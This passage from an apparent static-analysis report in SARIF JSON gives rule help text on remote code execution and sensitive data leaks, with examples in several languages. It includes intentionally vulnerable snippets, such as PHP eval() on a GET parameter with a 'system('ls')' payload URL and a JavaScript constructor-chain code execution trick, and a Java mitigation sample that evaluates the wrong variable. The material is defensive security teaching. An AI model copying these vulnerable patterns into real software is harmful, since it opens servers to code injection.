scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**",
                                "text": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/94.html",
                            "id": "warning-sink-execute-code/01d670f24fbaab3b2733c01cdc16e24b",
                            "name": "Remote Code Execution: Execution Of Non-Constant Code In Db-Init.js",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8.5",
                                    "CWE 94",
                                    "OWASP 2021 a03-injection",
                                    "OWASP a03-2021-injection",
                                    "OWASP a1-injection",
                                    "Remote Code Execution"
                                ]
                            },
                            "shortDescription": {
                                "text": "Remote Code Execution: Execution of Non-Constant Code in db-init.js"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file  